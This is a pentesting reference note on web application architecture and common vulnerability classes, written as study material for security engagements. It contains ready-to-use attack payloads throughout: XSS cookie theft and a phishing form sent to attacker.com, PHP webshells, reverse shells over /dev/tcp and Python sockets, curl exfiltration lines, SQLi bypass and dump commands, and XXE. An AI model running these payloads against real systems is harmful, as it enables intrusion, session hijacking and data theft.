# Intro to Web Apps

#CWES #WebApps #Frontend #Backend #XSS #CSRF #HTMLInjection #SQLi #CommandInjection #FileUpload #Enumeration

## What is this?

Foundational reference for web application architecture, front/back end components, and core vulnerability classes. Covers the attack angle for each concept — use as a primer before diving into technique-specific modules. Pairs with [[SQL Injection]], [[File Inclusion]], [[Cross-Site Scripting]], and [[Web Requests]].

---

## Web Application Layout

### Infrastructure Models

| Model | Description | Security Impact |
|---|---|---|
| Client-Server | Browser ↔ single server | Compromise server = full app access |
| One Server | App + DB on same host | Compromise one service = own everything |
| Many Servers - One DB | Multiple app servers share DB | SQLi on DB affects all app instances |
| Many Servers - Many DBs | Full segmentation | Most secure; DB access controlled per app |

> [!note]
> On engagements, identifying the infrastructure model tells you whether lateral movement after initial access is worthwhile. If DB is co-located, SQLi or RCE immediately gives you file system access to the DB. Segmented architectures require pivoting.

### Three-Tier Architecture

| Tier | Role |
|---|---|
| Presentation Layer | UI rendered in browser (HTML/CSS/JS) |
| Application Layer | Business logic, auth checks, API handling |
| Data Layer | Database — stores/retrieves data |

### Other Patterns

- **Microservices** — independent components (auth, payments, search) that communicate over HTTP/gRPC. Attack one service, look for trust relationships to others.
- **Serverless** — AWS Lambda / Azure Functions. Traditional server-side RCE is limited; focus on SSRF, misconfigured IAM roles, env variable leakage.

---

## Front End vs. Back End

### Front End (Client-Side)

Executes in the browser — attackers can see all of it.

| Component | Role | Attack Angle |
|---|---|---|
| HTML | Page structure, forms, links | Source review, hidden fields, comments |
| CSS | Styling | Framework fingerprinting (Bootstrap → version → known vulns) |
| JavaScript | Dynamic behavior, API calls | Hardcoded creds, endpoints, logic flaws |

### Back End (Server-Side)

Executes on the server — attackers interact through HTTP.

| Component | Examples | Attack Angle |
|---|---|---|
| Web Server | Apache, NGINX, IIS | Version disclosure, misconfigs, CVEs |
| App Framework | Laravel, Django, Express, Rails | Framework-specific vulns, debug modes |
| Database | MySQL, MSSQL, PostgreSQL, MongoDB | SQLi, NoSQLi, credential exposure |

### Top Developer Mistakes (Pentest Relevance)

| # | Mistake | What to Test |
|---|---|---|
| 1 | Unsanitized DB input | SQLi |
| 5 | Plaintext password storage | Dump DB and check hash type |
| 8 | Trusting client-side validation only | Intercept and tamper in Burp |
| 12 | Hard-coded backdoor accounts | Source review, default creds |
| 13 | Unverified SQL injection | Every input field |
| 14 | Remote file inclusion | LFI/RFI testing |
| 20 | WAF misconfiguration | Bypass testing |

---

## HTML

HTML structures pages as a DOM (Document Object Model) tree. Every element is a node — JS reads and writes nodes, which is the mechanism behind DOM XSS.

```html
<!DOCTYPE html>
<html>
  <head><title>Page Title</title></head>
  <body>
    <h1>Heading</h1>
    <p id="output">Paragraph</p>
  </body>
</html>
```

**DOM tree:** `document → html → head/body → children`

Reference nodes in JS: `document.getElementById("output")`, `document.getElementsByTagName("p")`

### URL Encoding

Browsers only allow ASCII in URLs — everything else gets percent-encoded. Critical for payload crafting.

| Character | Encoded | Character | Encoded |
|---|---|---|---|
| Space | `%20` | `'` | `%27` |
| `"` | `%22` | `<` | `%3C` |
| `>` | `%3E` | `&` | `%26` |
| `#` | `%23` | `/` | `%2F` |
| `+` | `%2B` | `=` | `%3D` |

```bash
# Quick encode/decode in terminal
python3 -c "import urllib.parse; print(urllib.parse.quote(\"' OR 1=1--\"))"
python3 -c "import urllib.parse; print(urllib.parse.unquote('%27%20OR%201%3D1--'))"

# Burp Suite Decoder — Ctrl+Shift+D
```

---

## CSS

Defines page styling. Pentest relevance is fingerprinting — framework version can indicate known vulns.

- **Bootstrap** — most common; version in source or `bootstrap.min.css` filename
- **SASS, Foundation, Bulma, Pure** — less common, useful for tech stack profiling

---

## JavaScript

JS drives all dynamic behavior. Primary attack surface for XSS, credential exposure, endpoint discovery.

**Common JS frameworks and what to look for:**

| Framework | Fingerprint | Notes |
|---|---|---|
| Angular | `ng-` attributes, `angular.js` | Check for `$sce.trustAsHtml()` — potential XSS bypass |
| React | `_react`, JSX artifacts | Source maps may expose full source |
| Vue | `v-bind`, `v-model`, `vue.js` | Template injection possible in v2 |
| jQuery | `jquery.js`, `$.ajax` | Old versions have known XSS gadgets |
| Node.js/Express | `express`, `package.json` | SSTI, RCE via `eval`, prototype pollution |

---

## Source Code Review

The first thing to do on any web app — look for low-hanging fruit before active testing.

```bash
# View page source
Ctrl+U  (browser)
view-source:https://target.com

# Download full source for grep
wget -r -l 2 http://target.com -P ./source/

# Grep for sensitive patterns
grep -rn "password\|passwd\|secret\|api_key\|token\|TODO\|FIXME\|admin" ./source/
grep -rn "<!--" ./source/        # HTML comments
grep -rn "\.php\|\.bak\|\.old\|\.swp" ./source/   # backup file references

# Find JS endpoints
grep -rn "fetch\|XMLHttpRequest\|$.ajax\|axios" ./source/
grep -rn "api/\|/v1/\|/v2/\|/admin" ./source/

# Beautify minified JS (Burp → Extensions → JS Beautifier, or online)
```

**DevTools recon (F12):**
- **Network tab** — capture all API requests and responses, see full headers
- **Sources tab** — browse JS files, set breakpoints, find hidden endpoints
- **Console tab** — run JS in context of the page
- **Application tab** — cookies, localStorage, sessionStorage, IndexedDB

> [!tip]
> Check JS source map files (`.map`) — devs sometimes leave these in production, exposing the full unminified source including comments.

---

## Sensitive Data Exposure

Unintentional exposure of credentials, keys, or internal paths in front-end source.

**What to look for:**

```bash
# Credentials in HTML comments
<!-- TODO: remove test credentials test:test -->
<!-- admin:P@ssw0rd123 -->

# API keys in JS
const API_KEY = "sk-abc123..."
var config = { token: "Bearer eyJ..." }

# Internal paths / staging URLs
src="/internal/debug.php"
href="https://staging.internal.corp/admin"

# Hidden form fields
<input type="hidden" name="role" value="user">
<input type="hidden" name="price" value="99.99">
```

**Tools:**

```bash
# Automated source scraping
python3 -m http.server    # serve local copy
feroxbuster -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt

# JS secret scanning
trufflehog filesystem ./source/
gitleaks detect --source=./source/ --no-git

# Find all JS files loaded by the page
curl -s http://target.com | grep -oP 'src="[^"]*\.js[^"]*"' | sed 's/src="//;s/"//'
```

> [!warning]
> Hidden form fields (price, role, user_id) are trivially tampered via Burp Intercept. Always test parameter manipulation on any hidden field.

---

## HTML Injection

Occurs when unfiltered user input is reflected directly into the page as HTML. Less severe than XSS (no script execution) but enables phishing, defacement, and fake login forms.

**Test:**

```html
<!-- Basic injection test -->
<h1>HTML Injected</h1>

<!-- Fake login form to steal credentials -->
<form action="http://attacker.com/log" method="POST">
  <p>Session expired. Please login again.</p>
  Username: <input name="user"><br>
  Password: <input type="password" name="pass"><br>
  <input type="submit" value="Login">
</form>
```

**Identify vulnerable parameters:**

```bash
# Inject a visible marker and check if it renders as HTML
?name=<b>TEST</b>
?search=<h1>INJECTED</h1>
?msg=<marquee>test</marquee>
```

> [!note]
> HTML injection that doesn't allow `<script>` may still allow event handlers (`<img src=x onerror=...>`) — always escalate to XSS testing.

---

## Cross-Site Scripting (XSS)

JS execution in victim's browser context. Enables cookie theft, credential harvest, session hijacking, CSRF, keylogging.

### XSS Types

| Type | Persistence | Example Location | Payload Fate |
|---|---|---|---|
| Reflected | None | Search bars, error pages, URL params | Delivered via crafted link |
| Stored | Permanent | Comments, profiles, forum posts | Executes for every viewer |
| DOM | None | Client-side JS reading `location.hash`, `innerHTML` | Never hits server |

### Basic Payloads

```javascript
// Cookie theft — confirm XSS and grab session
<script>document.location='http://attacker.com/log?c='+document.cookie</script>

// Image onerror — bypass basic script tag filters
<img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>

// DOM context — break out of attribute
" onmouseover="fetch('http://attacker.com/?c='+document.cookie)

// SVG — bypass HTML-only filters
<svg onload=alert(document.cookie)>

// Check cookie flags (HttpOnly blocks JS access — look for other data)
<script>alert(document.cookie)</script>

// Stored XSS — steal all users' cookies who view the page
<script>new Image().src='http://attacker.com/?c='+document.cookie</script>

// DOM XSS — write to innerHTML without sanitization
#"><img src=/ onerror=alert(document.cookie)>
```

### Filter Bypass Techniques

```javascript
// Case variation
<ScRiPt>alert(1)</ScRiPt>

// HTML entities
<script>al&#101;rt(1)</script>

// Encoding
<script>alert(1)</script>

// No parentheses (CSP bypass)
<script>onerror=alert;throw 1</script>

// Polyglot (works in multiple contexts)
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

**Tools:**

```bash
# Automated XSS scanning
dalfox url "http://target.com/search?q=FUZZ"
xsstrike -u "http://target.com/search?q=test"

# Blind XSS (fires on admin panel view)
# Use XSS Hunter or interactsh
<script src=https://YOUR.xss.ht></script>
```

> [!note]
> Check `HttpOnly` and `Secure` cookie flags before cookie theft attempts. If `HttpOnly` is set, pivot to CSRF or keylogging payloads instead.

---

## Cross-Site Request Forgery (CSRF)

Forces an authenticated victim's browser to make unintended requests. Requires the victim to be logged in and the app to rely solely on cookies for auth (no CSRF token, no `SameSite` cookie attribute).

### Attack Flow

```text
Attacker crafts malicious page → Victim visits it while authenticated → 
Victim's browser sends forged request with session cookie → Action executes as victim
```

### Payloads

```html
<!-- GET-based CSRF — change email -->
<img src="https://target.com/user/update?email=attacker@evil.com">

<!-- POST-based CSRF — change password -->
<form id="csrf" action="https://target.com/user/change-password" method="POST">
  <input name="new_password" value="hacked123">
  <input name="confirm" value="hacked123">
</form>
<script>document.getElementById('csrf').submit();</script>

<!-- JSON POST CSRF (requires CORS misconfiguration) -->
<script>
fetch('https://target.com/api/user/update', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: '{"email":"attacker@evil.com"}'
});
</script>
```

### Chained via XSS

```javascript
// Load external CSRF payload via stored XSS
"><script src=//attacker.com/exploit.js></script>
```

**Check for CSRF protection:**

```bash
# In Burp — remove or modify CSRF token and replay request
# If accepted: vulnerable
# Check SameSite cookie attribute in response headers
Set-Cookie: session=abc123; SameSite=Strict   # protected
Set-Cookie: session=abc123                     # potentially vulnerable

# Check for custom headers (X-Requested-With) as CSRF defense
```

> [!tip]
> CSRF + admin panel = password reset or privilege escalation. Combine with phishing delivery for maximum impact.

---

## Back End Servers — Dev Stacks

Knowing the stack narrows your exploit search immediately.

| Stack | OS | Web Server | DB | Language |
|---|---|---|---|---|
| LAMP | Linux | Apache | MySQL | PHP |
| WAMP | Windows | Apache | MySQL | PHP |
| WINS | Windows | IIS | SQL Server | .NET |
| MAMP | macOS | Apache | MySQL | PHP |
| XAMPP | Cross-platform | Apache | MySQL | PHP/Perl |

**Fingerprint the stack:**

```bash
whatweb http://target.com
curl -I http://target.com           # Server header
curl -I http://target.com/fake      # 404 error page reveals framework
wappalyzer                          # Browser extension
```

---

## Web Servers

### HTTP Methods

| Method | Purpose | Security Risk |
|---|---|---|
| GET | Retrieve data | Params in URL — logged everywhere |
| POST | Submit data | Body not in URL, but still logged by proxies |
| PUT | Create/replace resource | May allow arbitrary file upload if enabled |
| DELETE | Remove resource | Can delete app files if misconfigured |
| OPTIONS | List allowed methods | Reveals what's enabled — check it |
| TRACE | Debug echo | Can expose auth headers (XST attack) |
| PATCH | Partial update | Often unvalidated, test for injection |

```bash
# Check allowed methods
curl -X OPTIONS http://target.com -v
nmap --script http-methods -p 80,443 target.com

# Test PUT (may allow file write)
curl -X PUT http://target.com/shell.php -d '<?php system($_GET["cmd"]); ?>'
```

### HTTP Response Codes (Pentest Relevance)

| Code | Meaning | What It Tells You |
|---|---|---|
| 200 | OK | Page exists, note content |
| 301/302 | Redirect | Follow it — may reveal internal paths |
| 400 | Bad Request | Input parsing error — fuzz further |
| 401 | Unauthorized | Auth required — try default creds, bypass |
| 403 | Forbidden | Exists but blocked — try path bypass, method switch |
| 404 | Not Found | Standard miss |
| 405 | Method Not Allowed | Method blocked — try alternatives |
| 500 | Internal Server Error | App crashed — injection likely, check error output |
| 502/504 | Bad Gateway | Proxy/backend timeout — SSRF potential |

```bash
# 403 bypass techniques
curl http://target.com/admin              # blocked
curl http://target.com/ADMIN             # case variation
curl http://target.com/%2fadmin          # URL encoding
curl http://target.com/admin/.           # trailing dot
curl http://target.com/admin/ -H "X-Original-URL: /admin"
curl http://target.com/admin/ -H "X-Rewrite-URL: /admin"
curl http://target.com/ -H "X-Custom-IP-Authorization: 127.0.0.1"
```

### Apache vs NGINX vs IIS

| Server | Default Config Files | Common Vuln Areas |
|---|---|---|
| Apache | `/etc/apache2/apache2.conf`, `.htaccess` | CGI execution, `.htaccess` bypass, mod_status exposed |
| NGINX | `/etc/nginx/nginx.conf` | Alias traversal, misconfigured proxy pass, auth bypass |
| IIS | `web.config`, `applicationHost.config` | ShortName enumeration, WebDAV, .NET deserialization |

```bash
# Apache mod_status (often exposed internally)
curl http://target.com/server-status

# NGINX alias traversal (if /files/ aliases /var/www/files/)
curl http://target.com/files../etc/passwd

# IIS short name enumeration
java -jar iis_shortname_scanner.jar 2 20 http://target.com/

# IIS WebDAV
davtest -url http://target.com/
cadaver http://target.com/
```

---

## Databases

### Relational (SQL)

Data in structured tables with defined schemas. SQL queries retrieve and manipulate data.

| DB | Notes | Default Port |
|---|---|---|
| MySQL | Most common, open-source | 3306 |
| MSSQL | Windows/IIS environments, xp_cmdshell | 1433 |
| PostgreSQL | Extensible, `COPY TO/FROM` for file read/write | 5432 |
| Oracle | Enterprise, complex but powerful | 1521 |
| SQLite | File-based, common in mobile/small apps | N/A |
| MariaDB | MySQL fork, near-identical syntax | 3306 |

**Vulnerable PHP DB pattern:**

```php
// Direct string concatenation — textbook SQLi
$query = "select * from users where name like '%$searchInput%'";
$conn->query($query);
```

### Non-Relational (NoSQL)

No fixed schema. Queries use JSON-like syntax. Different injection technique required.

| DB | Storage Model | Default Port |
|---|---|---|
| MongoDB | Document (JSON) | 27017 |
| Redis | Key-Value | 6379 |
| CouchDB | Document (JSON) | 5984 |
| ElasticSearch | Document (JSON) | 9200 |
| Cassandra | Wide-Column | 9042 |

```bash
# MongoDB NoSQL injection
# Login bypass — if app passes JSON directly to query
{"username": {"$ne": null}, "password": {"$ne": null}}

# URL parameter injection
?username[$ne]=foo&password[$ne]=bar

# Redis unauthenticated access
redis-cli -h target.com
keys *
get <key>
```

---

## Development Frameworks & APIs

### Framework Fingerprinting

| Framework | Language | Fingerprints | Notable Vulns |
|---|---|---|---|
| Laravel | PHP | `laravel_session` cookie, `/public/index.php` | Debug mode RCE, deserialization |
| Django | Python | `csrftoken` cookie, `Django` in headers | Debug=True exposure, SSTI |
| Express | Node.js | `X-Powered-By: Express` | Prototype pollution, SSTI |
| Rails | Ruby | `_session_id` cookie, `rack` headers | Mass assignment, YAML deserialization |
| Spring | Java | `.do`/`.action` extensions, `JSESSIONID` | Log4Shell (if old), SpEL injection |
| ASP.NET | C#/.NET | `ASPXAUTH` cookie, `X-Powered-By: ASP.NET` | ViewState deserialization, padding oracle |

### APIs

#### Query Parameters

```http
GET /search.php?item=apples&category=fruit HTTP/1.1

POST /search.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

item=apples&category=fruit
```

#### REST API

```bash
# REST uses URL path for resources
GET  /api/users/1          # retrieve user
POST /api/users            # create user
PUT  /api/users/1          # update user
DELETE /api/users/1        # delete user

# Discover REST endpoints
ffuf -u http://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
arjun -u http://target.com/api/users -m GET

# Test IDOR (change user ID)
GET /api/users/1     → your data
GET /api/users/2     → someone else's data?
```

#### SOAP API

```xml
<!-- SOAP request structure (XML over HTTP) -->
POST /soap HTTP/1.1
Content-Type: text/xml; charset=utf-8
SOAPAction: "getUser"

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser>
      <userId>1</userId>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

```bash
# SOAP injection — test XXE and SQLi in XML body
# Replace userId value with XXE payload
<userId><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>&xxe;</userId>

# Find WSDL (service definition — lists all methods)
http://target.com/service?wsdl
http://target.com/service.wsdl
```

---

## Common Web Vulnerabilities

### Broken Authentication / Access Control

```bash
# Auth bypass — SQL injection in login
Username: admin'--
Username: ' OR 1=1--
Username: ' OR '1'='1

# Default credentials (always try before anything else)
admin:admin | admin:password | admin:123456 | admin:admin123
root:root | test:test | guest:guest

# Burp — force-browse to admin paths
/admin | /administrator | /manager | /dashboard | /console | /portal

# Broken Access Control — parameter tampering
# Change role, user_id, or access level in request
POST /update-profile
roleid=3  →  roleid=1      (admin role)
user_id=702  →  user_id=1  (admin account)

# JWT — modify claims (see jwt_tool note)
# IDOR — change object references
GET /user/702/profile  →  GET /user/1/profile
```

### Malicious File Upload

```bash
# Upload PHP webshell with double extension
mv shell.php shell.php.jpg
mv shell.php shell.pHp        # case variation
mv shell.php shell.php%00.jpg # null byte (old PHP)

# Simple PHP webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
echo '<?php echo shell_exec($_REQUEST["c"]); ?>' > shell.php

# Check if file type validated by MIME type (change in Burp)
Content-Type: image/jpeg  →  still execute if server checks extension

# After upload — find where file is stored
/uploads/shell.php
/media/shell.php
/files/shell.php
curl "http://target.com/uploads/shell.php?cmd=id"
```

### Command Injection

```bash
# Injection operators — test each
; id
| id
|| id
&& id
`id`
$(id)
%0a id       # newline (URL encoded)

# Blind — no output, use time delay or out-of-band
; sleep 5
; ping -c 5 attacker.com
; curl http://attacker.com/?o=$(id|base64)

# Full reverse shell via injection
; bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'

# WordPress Plainview Activity Monitor — pipe injection
ip=127.0.0.1 | id
```

### SQL Injection

```bash
# Detection — cause an error
'
''
`
')
"))
' OR '1'='1

# Auth bypass
admin'--
' OR 1=1--
' OR 'x'='x

# UNION-based (enumerate columns first)
' ORDER BY 1--
' ORDER BY 2--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,user(),database()--

# Blind — boolean
' AND 1=1--   # true (normal response)
' AND 1=2--   # false (different response)

# Time-based blind
'; IF(1=1) WAITFOR DELAY '0:0:5'--    # MSSQL
' AND SLEEP(5)--                       # MySQL

# Automated
sqlmap -u "http://target.com/search?q=test" --dbs
sqlmap -u "http://target.com/search?q=test" -D dbname --tables
sqlmap -u "http://target.com/search?q=test" -D dbname -T users --dump

# POST parameter
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" -p user
```

> [!note]
> SQLi in AD-integrated apps may not dump passwords (AD manages them) but often exposes full user lists and email addresses — useful for password spraying OWA, VPN portals, or O365.

---

## Public Vulnerabilities

### Finding CVEs

```bash
# Step 1 — identify version
whatweb http://target.com
curl -s http://target.com | grep -i "version\|powered"
# Check /readme.txt, /changelog.txt, /CHANGELOG, /version.php

# Step 2 — search for exploits
searchsploit <application> <version>
searchsploit -m <exploit-id>        # copy to working dir

# Online sources
# https://www.exploit-db.com
# https://www.rapid7.com/db/
# https://packetstormsecurity.com
# https://github.com/search?q=CVE-YYYY-NNNNN

# Step 3 — check Metasploit
msfconsole -q
search <application>
use <module>
```

### CVSS Scoring

| Version | Severity | Score Range |
|---|---|---|
| CVSS v2 | Low | 0.0 – 3.9 |
| CVSS v2 | Medium | 4.0 – 6.9 |
| CVSS v2 | High | 7.0 – 10.0 |
| CVSS v3 | None | 0.0 |
| CVSS v3 | Low | 0.1 – 3.9 |
| CVSS v3 | Medium | 4.0 – 6.9 |
| CVSS v3 | High | 7.0 – 8.9 |
| CVSS v3 | Critical | 9.0 – 10.0 |

**Prioritize during assessments:** Focus on CVSS ≥ 8.0 or any vuln leading to RCE. Use [[NVD]] / Rapid7 DB for quick scoring reference.

**CVSS Base Metric Groups:**
- **Exploitability:** Attack Vector, Attack Complexity, Privileges Required, User Interaction
- **Impact:** Confidentiality, Integrity, Availability

> [!note]
> NVD only publishes Base scores. For client reports, apply Temporal (patch availability, exploit maturity) and Environmental (asset criticality, existing controls) metrics to arrive at a contextualized score that reflects actual risk to the client.

---

## Related Notes

- [[SQL Injection]]
- [[File Inclusion]]
- [[XSS]]
- [[Command Injection]]
- [[File Upload Attacks]]
- [[Web Requests]]
- [[Tools/Web/Burpsuite]]
- [[Tools/Web/ffuf]]
- [[Tools/Web/sqlmap]]

---

*Created: 2026-04-24*
*Updated: 2026-04-24*
*Model: claude-sonnet-4-6*
